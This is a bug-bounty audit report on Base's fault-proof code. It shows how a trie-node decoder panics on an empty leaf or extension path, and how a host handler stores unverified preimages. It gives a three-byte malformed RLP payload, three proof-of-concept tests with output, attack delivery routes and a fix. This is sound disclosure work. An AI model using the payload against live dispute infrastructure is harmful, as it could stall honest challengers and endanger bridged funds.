# 75535 bc insight mpt trie node decoder panics on empty leaf or extension path breaking fault proof liveness

**Submitted on Apr 29th 2026 at 17:10:00 UTC by @coffee\_boi for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75535
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Direct loss to Base or users ≥ 10% of funds held within Bridge.

## Description

## Summary

`TrieNode::decode` in `base-proof-mpt` panics with an index out of bounds when it is asked to decode a leaf or extension node whose RLP encoded path is empty. The decoder reads the first nibble of the path with `path[0]` before checking that the path has any bytes.

This is reachable through the proof client's normal trie-node oracle boundary when a malformed preimage is returned for a requested node hash. The production host has a separate validation gap in the `HintType::L2StateNode` path: it stores whatever `debug_dbGet(hash)` returns under the requested keccak preimage key without checking that `keccak256(preimage) == hash`. Because off-chain TEE/ZK proving consumes the populated host witness directly, a poisoned or incorrect L2 RPC response can deliver malformed trie bytes to the proof program without requiring a keccak collision.

Because this code runs inside the fault proof program, a panic during proof execution prevents the honest challenger from producing a proof for the disputed transition. A persistent malformed preimage for a required trie node can stall the off-chain proof path on the honest side.

## Description

The vulnerable function is `try_decode_leaf_or_extension_payload` in `crates/proof/mpt/src/node.rs`:

```rust
fn try_decode_leaf_or_extension_payload(buf: &mut &[u8]) -> TrieNodeResult<Self> {
    let path = Bytes::decode(buf).map_err(TrieNodeError::RLPError)?;
    let first_nibble = path[0] >> NIBBLE_WIDTH;
    let first = match first_nibble {
        PREFIX_EXTENSION_ODD | PREFIX_LEAF_ODD => Some(path[0] & 0x0F),
        PREFIX_EXTENSION_EVEN | PREFIX_LEAF_EVEN => None,
        _ => return Err(TrieNodeError::InvalidNodeType),
    };

    match first_nibble {
        PREFIX_EXTENSION_EVEN | PREFIX_EXTENSION_ODD => {
            let extension_node_value = Self::decode(buf).map_err(TrieNodeError::RLPError)?;
            Ok(Self::Extension {
                prefix: unpack_path_to_nibbles(first, path[1..].as_ref()),
                node: Box::new(extension_node_value),
            })
        }
        PREFIX_LEAF_EVEN | PREFIX_LEAF_ODD => {
            let value = Bytes::decode(buf).map_err(TrieNodeError::RLPError)?;
            Ok(Self::Leaf { prefix: unpack_path_to_nibbles(first, path[1..].as_ref()), value })
        }
        _ => Err(TrieNodeError::InvalidNodeType),
    }
}
```

`Bytes::decode` accepts an empty RLP string. When that happens, `path` is a zero length slice. The very next line indexes `path[0]`, which is unguarded and panics. The same problem is repeated at `path[1..]` in the two `unpack_path_to_nibbles` calls, where slicing past the end of an empty buffer also panics.

The decoder must never panic on attacker shaped input. The expected behaviour for any malformed RLP node, including one with an empty path, is a clean `Err(TrieNodeError::InvalidNodeType)` so that the caller can decide what to do.

The smallest input that triggers the bug is the three byte RLP value `0xc28080`, which encodes the two item list `[ empty_path, empty_value ]`. Storing this preimage under its keccak256 hash is sufficient to crash any code path that asks the preimage oracle to materialise that hash as a trie node.

The decoder is called from the proof client's oracle backed L2 chain provider:

```
OracleL2ChainProvider::trie_node_by_hash
    -> oracle.get(PreimageKey::new(hash, PreimageKeyType::Keccak256))
    -> TrieNode::decode(preimage)
```

The proof program is the program that the honest challenger runs to generate a fault proof for a disputed game. If that program panics, the proof never completes, and the challenger has nothing to submit on chain.

## Host preimage validation gap

The host should only insert keccak preimages after verifying that the returned bytes match the requested hash. The `L2StateNode` hint handler does not do that:

```rust
HintType::L2StateNode => {
    let hash: B256 = hint.data.as_ref().try_into()?;

    let preimage: Bytes = providers.l2.client().request("debug_dbGet", &[hash]).await?;

    let mut kv_write_lock = kv.write().await;
    kv_write_lock.set(PreimageKey::new_keccak256(*hash).into(), preimage.into())?;
}
```

By contrast, the account proof paths compute the hash from each returned proof node before inserting it:

```rust
proof_response.account_proof.into_iter().try_for_each(|node| {
    let node_hash = keccak256(node.as_ref());
    let key = PreimageKey::new_keccak256(*node_hash);
    kv_lock.set(key.into(), node.into())?;
    Ok::<(), HostError>(())
})?;
```

This means the host KV store is not universally hash-bound. For `L2StateNode`, the proof program can request an honest trie node hash `H`, while a faulty or adversarial RPC returns `0xc28080`; the host records that malformed value under the preimage key for `H`, and `OracleL2ChainProvider::trie_node_by_hash` later decodes it as if it were the committed node.

This does not require finding bytes whose keccak hash is `H`. It requires control of, or corruption in, the host's L2 RPC/preimage delivery path for `debug_dbGet`.

## Likelihood Explanation

The bug itself is unconditional. Any code path that asks `TrieNode::decode` to materialise a node whose path is empty will panic.

To reach that code path in production, the attacker needs the honest proof program to load a preimage whose value is a malformed leaf or extension node. The honest challenger does not generate this preimage on its own. Concretely, this requires one of:

1. A malicious proposer or upstream component injects a reference to the malformed node hash into a witness, account proof, storage proof, header field, or other structure that the proof program follows. When the proof program walks the structure, it eventually requests `keccak256(0xc28080)` from the oracle, the oracle returns `0xc28080`, and the decoder panics.
2. A poisoned preimage bundle is shipped with the dispute artifacts that the honest challenger consumes.
3. An L2 RPC or oracle proxy in the challenger's stack returns `0xc28080` for a legitimately requested state node hash `H`. This is currently accepted by `HintType::L2StateNode` because the host does not check that `keccak256(0xc28080) == H`.

In a healthy network, canonical L2 state should not contain this node, and an honest RPC should not serve it. The realistic likelihood depends on how trusted the witness and preimage path is end to end. The proof system's value is exactly that it should not have to trust those inputs. As long as a malformed node can survive into the proof program's preimage requests, the panic is reachable.

The malformed node fits in three bytes. The challenge is delivery, not construction. Without the `L2StateNode` validation gap, delivery would require a canonical trie reference to the malformed node hash or a poisoned preimage bundle. With the gap, a bad `debug_dbGet` response for any legitimately requested state node hash is enough.

For these reasons the likelihood is best described as conditional but not exotic. It does not require key compromise, sequencer privileges, or special network position. It requires the attacker to control or influence one piece of witness or preimage data.

## Impact Explanation

The proof system is the load bearing component that turns disputed L2 state transitions into a verified outcome on L1. Liveness of that component is what guarantees that an invalid proposal can be challenged in time. If the honest challenger cannot finish a proof for a disputed transition, the dispute timer keeps running on the malicious side without an answer.

When the decoder panics inside the proof program:

* TEE proof generation fails with the panic message.
* The driver schedules the ZK fallback. If the ZK path also cannot produce a proof, no proof is submitted.
* The challenger's pending entry stays in `AwaitingProof` and the retry counter increments. The dispute does not advance on the honest side.
* A persistent malformed preimage for the required state path keeps reproducing the panic. The honest side never produces a submit ready proof for that game.

In the FPVM or MIPS style execution setting that the proof program targets, an equivalent abort halts the program instead of producing a clean invalid node result. The proof contract on L1 cannot finalize a verdict from a halted program.

The end state of a successful exploit is that a malicious proposer wins a dispute by default, because the challenger cannot complete the proof in time. That maps directly to bridge fund loss when the disputed game governs withdrawals or output proposals. Even without an immediate fund loss, the soundness of the dispute system is broken for the duration that the malformed reference is reachable.

## Recommendation

Reject empty paths before any indexing in `try_decode_leaf_or_extension_payload`:

```rust
fn try_decode_leaf_or_extension_payload(buf: &mut &[u8]) -> TrieNodeResult<Self> {
    let path = Bytes::decode(buf).map_err(TrieNodeError::RLPError)?;
    if path.is_empty() {
        return Err(TrieNodeError::InvalidNodeType);
    }
    let first_nibble = path[0] >> NIBBLE_WIDTH;
    // rest unchanged
}
```

This converts the malformed input into a normal decode error and lets the caller handle it the same way it handles any other invalid node.

Recommended companion changes:

1. Verify `keccak256(preimage) == hash` before inserting any `HintType::L2StateNode` result under `PreimageKey::new_keccak256(*hash)`. Return a host error on mismatch.
2. Audit every other indexing site in `crates/proof/mpt/src/node.rs` and replace direct `path[i]` and `path[i..]` access with checked `get` and `get(i..)` calls that map to `TrieNodeError::InvalidNodeType` on `None`. The same shape of bug is likely to recur in other branches of the decoder.
3. Add a fuzz target for `TrieNode::decode` in the proof workspace. The decoder is on the boundary between attacker controlled bytes and proof execution. Fuzzing it under `cargo fuzz` or a property based harness will surface other panics of this class.
4. Treat any panic in proof execution as a correctness bug, not an availability bug. The proof program should always produce a structured error for malformed inputs.

The PoCs above can be kept as regression tests once the fix is in place. The first two should switch from `#[should_panic]` to asserting that decoding returns a `TrieNodeError::InvalidNodeType`. The challenger level test should be replaced by one that asserts the proof program reports a clean decode error rather than panicking.

## Proof of Concept

Three layered PoCs are included, each one running closer to the real attack surface than the last. All three are committed in the working tree and pass under `cargo test`. File and line references for the as-checked-in versions:

* PoC 1: `crates/proof/mpt/src/node.rs:717` (`test_decode_leaf_or_extension_empty_path_panics`)
* PoC 2: `crates/proof/proof/src/l2/chain_provider.rs:328` (`malformed_trie_preimage_panics_through_l2_provider`)
* PoC 3: `crates/proof/challenge/tests/driver.rs:640` (`test_step_invalid_game_mpt_decode_failure_leaves_no_ready_proof`)

The full reproduction command set:

```bash
cargo test -p base-proof-mpt test_decode_leaf_or_extension_empty_path_panics -- --nocapture
cargo test -p base-proof malformed_trie_preimage_panics_through_l2_provider -- --nocapture
cargo test -p base-challenger --test driver test_step_invalid_game_mpt_decode_failure_leaves_no_ready_proof -- --nocapture
```

All three return `ok` on the current working tree. The first two land on the same panic site at `crates/proof/mpt/src/node.rs:442:28` with the message `index out of bounds: the len is 0 but the index is 0`. The third demonstrates that when the panic surfaces as a TEE failure and the ZK fallback also fails, the challenger driver retains the pending entry in `AwaitingProof` with `retry_count = 1`.

{% stepper %}
{% step %}

### Direct decoder crash

Test source at `crates/proof/mpt/src/node.rs:717`:

```rust
#[test]
#[should_panic(expected = "index out of bounds")]
fn test_decode_leaf_or_extension_empty_path_panics() {
    const EMPTY_PATH_LEAF_OR_EXTENSION_RLP: [u8; 3] = hex!("c28080");

    let _ = TrieNode::decode(&mut EMPTY_PATH_LEAF_OR_EXTENSION_RLP.as_slice());
}
```

Run:

```bash
cargo test -p base-proof-mpt test_decode_leaf_or_extension_empty_path_panics -- --nocapture
```

Observed:

```
thread 'node::tests::test_decode_leaf_or_extension_empty_path_panics' panicked at crates/proof/mpt/src/node.rs:442:28:
index out of bounds: the len is 0 but the index is 0
test node::tests::test_decode_leaf_or_extension_empty_path_panics - should panic ... ok
```

{% endstep %}

{% step %}

### Panic through the proof client oracle boundary

This shows that the panic is reachable through the same oracle backed provider that the proof program uses, not only through a direct unit call. In the minimal version, the malformed preimage is keyed by its own keccak256 hash so that an oracle can serve it for any witness that references that hash.

The production `L2StateNode` validation gap makes the boundary more dangerous: the malformed bytes do not need to be stored under `keccak256(0xc28080)`. If `debug_dbGet(H)` returns `0xc28080`, the host stores `0xc28080` under the requested preimage key for `H`.

Test source at `crates/proof/proof/src/l2/chain_provider.rs:328`:

```rust
#[cfg(test)]
mod tests {
    use alloc::{collections::BTreeMap, sync::Arc, vec::Vec};

    use alloy_primitives::keccak256;
    use async_trait::async_trait;
    use base_consensus_genesis::RollupConfig;
    use base_proof_mpt::OrderedListWalker;
    use base_proof_preimage::{
        HintWriterClient, PreimageOracleClient,
        errors::{PreimageOracleError, PreimageOracleResult},
    };

    use super::*;

    #[derive(Clone, Debug, Default)]
    struct MockOracle {
        preimages: Arc<BTreeMap<PreimageKey, Vec<u8>>>,
    }

    #[async_trait]
    impl PreimageOracleClient for MockOracle {
        async fn get(&self, key: PreimageKey) -> PreimageOracleResult<Vec<u8>> {
            self.preimages.get(&key).cloned().ok_or(PreimageOracleError::KeyNotFound)
        }

        async fn get_exact(&self, key: PreimageKey, buf: &mut [u8]) -> PreimageOracleResult<()> {
            let value = self.preimages.get(&key).ok_or(PreimageOracleError::KeyNotFound)?;
            if value.len() != buf.len() {
                return Err(PreimageOracleError::BufferLengthMismatch(buf.len(), value.len()));
            }
            buf.copy_from_slice(value);
            Ok(())
        }
    }

    #[async_trait]
    impl HintWriterClient for MockOracle {
        async fn write(&self, _hint: &str) -> PreimageOracleResult<()> {
            Ok(())
        }
    }

    #[test]
    #[should_panic(expected = "index out of bounds")]
    fn malformed_trie_preimage_panics_through_l2_provider() {
        const MALFORMED_LEAF_OR_EXTENSION: [u8; 3] = [0xC2, 0x80, 0x80];

        let root = keccak256(MALFORMED_LEAF_OR_EXTENSION);
        let key = PreimageKey::new_keccak256(*root);
        let preimages = Arc::new(BTreeMap::from([(key, MALFORMED_LEAF_OR_EXTENSION.to_vec())]));
        let oracle = Arc::new(MockOracle { preimages });
        let provider =
            OracleL2ChainProvider::new(B256::ZERO, Arc::new(RollupConfig::default()), oracle);

        let _ = OrderedListWalker::try_new_hydrated(root, &provider);
    }
}
```

Run:

```bash
cargo test -p base-proof malformed_trie_preimage_panics_through_l2_provider -- --nocapture
```

Observed:

```
thread 'l2::chain_provider::tests::malformed_trie_preimage_panics_through_l2_provider' panicked at crates/proof/mpt/src/node.rs:442:28:
index out of bounds: the len is 0 but the index is 0
```

{% endstep %}

{% step %}

### Liveness consequence at the challenger

When the prover panics during proof generation, the challenger's TEE path returns a failure. The driver falls back to ZK. If that path also fails or has not been provisioned, the challenger has no proof ready to submit and the dispute stalls on the honest side.

Test source at `crates/proof/challenge/tests/driver.rs:640`:

```rust
#[tokio::test]
async fn test_step_invalid_game_mpt_decode_failure_leaves_no_ready_proof() {
    let (l2, factory, verifier) = invalid_game_mocks();

    let tee = Arc::new(MockTeeProofProvider::failure(
        "proving failed: index out of bounds: the len is 0 but the index is 0",
    ));
    let zk = failed_zk_prover("zk-after-mpt-decode-fail");

    let tx_manager = default_tx_manager();
    let mut driver = test_driver_with_tee(
        factory,
        verifier,
        l2,
        zk,
        tx_manager,
        Some(tee_config(tee, Arc::new(MockL1HeadProvider::failure("dummy")))),
    );

    driver.step().await.unwrap();
    let entry =
        driver.pending_proofs.get(&addr(0)).expect("ZK fallback should be pending after TEE panic");
    assert!(
        matches!(entry.phase, ProofPhase::AwaitingProof { .. }),
        "phase should be AwaitingProof after TEE panic fallback"
    );

    driver.step().await.unwrap();
    let entry =
        driver.pending_proofs.get(&addr(0)).expect("failed ZK proof should be retained for retry");
    assert!(
        matches!(entry.phase, ProofPhase::AwaitingProof { .. }),
        "phase should be AwaitingProof after re-initiating the failed fallback proof"
    );
    assert_eq!(entry.retry_count, 1, "fallback proof failure should be counted");
}
```

Run:

```bash
cargo test -p base-challenger --test driver test_step_invalid_game_mpt_decode_failure_leaves_no_ready_proof -- --nocapture
```

Observed:

```
test test_step_invalid_game_mpt_decode_failure_leaves_no_ready_proof ... ok
```

The honest challenger ends a step still holding a not ready entry. Repeated steps continue to fail in the same way as long as the malformed preimage is required.
{% endstep %}
{% endstepper %}
